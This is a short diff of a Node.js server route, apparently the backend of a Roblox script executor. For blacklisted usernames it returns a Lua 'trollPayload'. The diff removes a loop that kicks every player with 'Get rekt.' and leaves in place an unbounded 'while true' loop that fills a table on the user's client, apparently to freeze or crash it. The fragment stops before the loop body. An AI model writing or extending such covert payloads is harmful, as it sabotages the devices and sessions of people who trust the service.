@@ -24,9 +24,6 @@ app.post("/executeRequest", (req, res) => {
 
   if (blacklist.has(username)) {
     const trollPayload = `
-for _, player in ipairs(game.Players:GetPlayers()) do
-    player:Kick("Get rekt.")
-end
 if game:GetService("Players").LocalPlayer then
     local t = {}
     while true do
